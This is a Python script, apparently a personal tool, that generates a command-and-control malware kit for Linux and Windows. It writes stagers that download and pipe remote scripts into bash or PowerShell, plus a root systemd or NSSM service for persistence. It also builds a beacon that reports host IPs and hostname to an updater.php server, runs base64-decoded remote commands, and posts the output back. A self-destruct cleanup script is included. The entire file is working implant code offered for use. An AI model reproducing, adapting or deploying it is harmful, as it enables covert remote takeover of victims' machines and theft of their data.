# Gotta rewrite this entire fuckin thing since I lost my old generator @-@
import argparse
import shutil
from pathlib import Path
def main():
    parser = argparse.ArgumentParser(description="Usage: GenPayload.py [options]")
    parser.add_argument("-os", "--operatingsystem", required=True, type=int, default=0, help="0 -> Linux, 1 -> Windows. Default 0")
    parser.add_argument("-hh", "--host", required=True, type=str, help="The call back host")
    parser.add_argument("-p", "--port", default=80, type=int, help="The call back port. Default: 80")
    parser.add_argument("-bp", "--beamport", default=8080, type=int, help="File transfer port. Default: 8080")
    parser.add_argument("-i", "--interval", default=10, type=int, help="The call back port. Default: 10")
    parser.add_argument("-a", "--architecture", default=32, type=int, help="[WINDOWS ONLY] Architecture of the machine. Default 32")
    parser.add_argument("-stn", "--stagername", type=str, default="installer", help="The name you want the malicious service file to be under. Default: installer")
    parser.add_argument("-sn", "--servicename", type=str, default="InitSettings", help="The name you want the malicious service file to be under. Default: InitSettings")
    parser.add_argument("-sd", "--servicedescription", type=str, default="Initial configuration settings", help="The description you want the malicious service file have. Default: Initial configuration settings")
    parser.add_argument("-bn", "--beaconname", type=str, default="init", help="The name of the executable. Default: init")
    parser.add_argument("-bsn", "--battleshipname", type=str, default="InitDaemon", help="The name of the Battleship memeware executable. Default: initDaemon")
    parser.add_argument("-sdn", "--selfdestructname", type=str, default="SelfDe", help="[WINDOWS ONLY] The name of the malware self destruct. Default: SelfDe")
    args = parser.parse_args()

    if args.operatingsystem == 0:
        runCmdFile = Path(f"runner.sh")
        stagerFile = Path(f"Beam/Linux/{args.stagername}.sh")
        serviceFile = Path(f"Beam/Linux/{args.servicename}.service")
        beaconFile = Path(f"Beam/Linux/{args.beaconname}.sh")

        runCmdFile.parent.mkdir(parents=True, exist_ok=True)
        stagerFile.parent.mkdir(parents=True, exist_ok=True)
        serviceFile.parent.mkdir(parents=True, exist_ok=True)
        beaconFile.parent.mkdir(parents=True, exist_ok=True)

        stagerContent = f"""#!/bin/bash
sudo curl -s http://{args.host}:{args.beamport}/{args.servicename}.service -o /etc/systemd/system/{args.servicename}.service
sudo systemctl enable {args.servicename}.service
sleep 1
sudo systemctl start {args.servicename}.service"""
        serviceContent = f"""[Unit]
Description=Initiation Services
After=network.target

[Service]
Type=simple
User=root
ExecStart=/bin/sh -c '/usr/bin/curl -s http://{args.host}:{args.beamport}/{args.beaconname}.sh | bash'
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target"""
        beaconContent = f"""#!/bin/bash
id=$((hostname -I || hostname -i) 2>/dev/null | md5sum | cut -d' ' -f1)
ips=$((hostname -I || hostname -i) 2>/dev/null)
hn=$(hostname)
p="{args.servicename}"
beac="{args.beaconname}"
bp="{args.beamport}"
curl -s -X POST "http://{args.host}:{args.port}/updater.php?h4h4h4=l33t&p=1&fl0x=$id" -d "ev3=$ips" -d "pr0x=$hn" -d "l1nx=$p" -d "g0t4=$beac" -d "t4ck=$bp"
while sleep {args.interval}; do
    cmd=$(curl -s "http://{args.host}:{args.port}/updater.php?h4h4h4=l33t&p=1&fl0x=$id")
    if [[ "$cmd" == "1" ]]; then
        continue
    fi
    cmd=$(echo $cmd | base64 -d)
    fev="($cmd;) > /tmp/o.txt 2>/tmp/o.txt"
    eval $fev
    curl -s -X POST "http://{args.host}:{args.port}/updater.php?p=1&fl0x=$id" -d "fumEqHaTQR=`cat /tmp/o.txt | base64`" -o /dev/null
    rm /tmp/o.txt
done"""
        runCmdContent = f"curl -s http://{args.host}:{args.beamport}/{args.stagername}.sh | bash"

        with open(stagerFile, "w", encoding="utf-8") as file:
            file.write(stagerContent)

        with open(serviceFile, "w", encoding="utf-8") as file:
            file.write(serviceContent)

        with open(beaconFile, "w", encoding="utf-8") as file:
            file.write(beaconContent)

        with open(runCmdFile, "w", encoding="utf-8") as file:
            file.write(runCmdContent)

        shutil.copy("ShipFiles/Linux/InitDaemon",f"Beam/Linux/{args.battleshipname}")
        print(f"\n[+] Run the following on host: \n\ncd Beam/Linux; python3 -m http.server {args.beamport}\n")
        print(f"\n[+] Run the following on target:\n\n{runCmdContent}\n")

    if args.operatingsystem == 1:
        runCmdFile = Path(f"runner.ps1")
        stagerFile = Path(f"Beam/Windows/{args.stagername}.ps1")
        selfDeFile = Path(f"Beam/Windows/{args.selfdestructname}.ps1")
        beaconFile = Path(f"Beam/Windows/{args.beaconname}.ps1")

        runCmdFile.parent.mkdir(parents=True, exist_ok=True)
        stagerFile.parent.mkdir(parents=True, exist_ok=True)
        selfDeFile.parent.mkdir(parents=True, exist_ok=True)
        beaconFile.parent.mkdir(parents=True, exist_ok=True)
        #NSSM FROM THE INTERNET

        #stagerContent = f"""Set-PSRepository -Name 'PSGallery' -InstallationPolicy Trusted
#Install-Module -Name ps2exe -Force -AllowClobber -Confirm:$false
#Invoke-WebRequest -Uri "https://nssm.cc/release/nssm-2.24.zip" -OutFile "$env:Temp\\nssm.zip"
#Invoke-WebRequest -Uri "https://nssm.cc" -OutFile "$env:Temp\\nssm.zip"
#Invoke-WebRequest -Uri "http://{args.host}:{args.beamport}/{args.beaconname}.ps1" -OutFile "$env:Temp\\{args.beaconname}.ps1"
#Expand-Archive -Path "$env:Temp\\nssm.zip" -DestinationPath "$env:Temp\\nssm_extracted" -Force
#Copy-Item "$env:TEMP\\nssm_extracted\\nssm-2.24-101-g897c7ad\\win64\\nssm.exe" -Destination "C:\\Windows\\nssm.exe"
#Invoke-ps2exe -inputFile "$env:TEMP\\{args.beaconname}.ps1" -outputFile "C:\\Windows\\{args.beaconname}.exe"
#Remove-Item "$env:TEMP\\{args.beaconname}.ps1", "$env:Temp\\nssm.zip", "$env:TEMP\\nssm_extracted" -Recurse -Force
#C:\\Windows\\nssm.exe install {args.servicename} "C:\\Windows\\{args.beaconname}.exe"
#C:\\Windows\\nssm.exe set {args.servicename} Description {args.servicedescription} 
#C:\\Windows\\nssm.exe set {args.servicename} Start SERVICE_AUTO_START
#C:\\Windows\\nssm.exe start {args.servicename}"""
  
        # LOCAL NSSM

        stagerContent = f"""Set-PSRepository -Name 'PSGallery' -InstallationPolicy Trusted
Install-Module -Name ps2exe -Force -AllowClobber -Confirm:$false
Invoke-WebRequest -Uri "http://{args.host}:{args.beamport}/nssm.exe" -OutFile "C:\\Windows\\nssm.exe"
Invoke-WebRequest -Uri "http://{args.host}:{args.beamport}/{args.beaconname}.ps1" -OutFile "$env:Temp\\{args.beaconname}.ps1"
Invoke-ps2exe -inputFile "$env:TEMP\\{args.beaconname}.ps1" -outputFile "C:\\Windows\\{args.beaconname}.exe"
Remove-Item "$env:TEMP\\{args.beaconname}.ps1" -Force
C:\\Windows\\nssm.exe install {args.servicename} "C:\\Windows\\{args.beaconname}.exe"
C:\\Windows\\nssm.exe set {args.servicename} Description {args.servicedescription} 
C:\\Windows\\nssm.exe set {args.servicename} Start SERVICE_AUTO_START
C:\\Windows\\nssm.exe start {args.servicename}"""

        beaconContent = f"""
$ips = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {{ $_.IPAddress -ne "127.0.0.1" -and $_.PrefixOrigin -ne "WellKnown" }}).IPAddress -join ", "
$bytes = [System.Text.Encoding]::UTF8.GetBytes($ips)
$md5 = [System.Security.Cryptography.MD5]::Create()
$id = (([BitConverter]::ToString($md5.ComputeHash($bytes))) -replace "-", "").ToLower()
$hn = [uri]::EscapeDataString($env:COMPUTERNAME)
$p = "{args.servicename}"
$beac = "{args.beaconname}"
$bp = "{args.beamport}"
$postBody = @{{
    "ev3" = $ips
    "pr0x" = $hn
    "l1nx" = $p
    "g0t4" = $beac
    "t4ck" = $bp
}}
Invoke-RestMethod -Uri "http://{args.host}:{args.port}/updater.php?h4h4h4=l33t&p=2&fl0x=$id" -Method Post -Body $postBody
while ($true) {{
    Start-Sleep -Seconds {args.interval}
    $cmd = (Invoke-WebRequest -Uri "http://{args.host}:{args.port}/updater.php?h4h4h4=l33t&p=2&fl0x=$id" -UseBasicParsing).Content.Trim()
    #Write-Host "Encoded: $cmd"
    if($cmd -eq "1"){{
        continue
    }}
    $cmd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cmd))
    #Write-Host "Decoded: $cmd"
    $outFile = [System.IO.Path]::GetTempFileName()
    $errFile = [System.IO.Path]::GetTempFileName()
    $process = Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile", "-Command", "$cmd *>&1 | Out-File -FilePath `"$outFile`" -Encoding utf8" -NoNewWindow -PassThru -Wait -RedirectStandardError $errFile
    $process | Wait-Process -Timeout 30
    $output = Get-Content $outFile -Raw	
    $error = Get-Content $errFIle -Raw
    #Write-Host "Exit code: $($process.ExitCode)"
    #Write-Host "Output: $output"
    $back = ""
    if($($process.ExitCode) -eq 1){{
	$back = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($error))
    }}else{{
	$back = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($output))
    }}
    $body = @{{
        "fumEqHaTQR" = $back
    }}
    Invoke-RestMethod -Uri "http://{args.host}:{args.port}/updater.php?&p=2&fl0x=$id" -Method Post -Body $body
    Remove-Item $outFile
    Remove-Item $errFile
}}"""
        runCmdContent = f"Start-Process \"powershell.exe\" -ArgumentList \"-NoProfile\", \"-Command\", ([System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri \"http://{args.host}:{args.beamport}/{args.stagername}.ps1\" -UseBasicParsing).Content)).Trim() -NoNewWindow -Wait"
        selfDeContent = f"C:\\Windows\\nssm.exe stop \"{args.servicename}\"; C:\\Windows\\nssm.exe remove \"{args.servicename}\" confirm; Remove-Item \"C:\\Windows\\{args.beaconname}.exe\"; Remove-Item \"C:\\Windows\\nssm.exe"; 
        with open(stagerFile, "w", encoding="utf-8") as file:
            file.write(stagerContent)

        with open(beaconFile, "w", encoding="utf-8") as file:
            file.write(beaconContent)

        with open(runCmdFile, "w", encoding="utf-8") as file:
            file.write(runCmdContent)

        with open(selfDeFile, "w", encoding="utf-8") as file:
            file.write(selfDeContent)

        shutil.copy(f"ShipFiles/Windows/NSSM/{args.architecture}/nssm.exe",f"Beam/Windows/")
        
        print(f"\n[+] Run the following on host: \n\ncd Beam/Windows; python3 -m http.server {args.beamport}")
        print(f"\n[+] Run the following on target:\n\n{runCmdContent}\n")

if __name__ == "__main__":
    main()
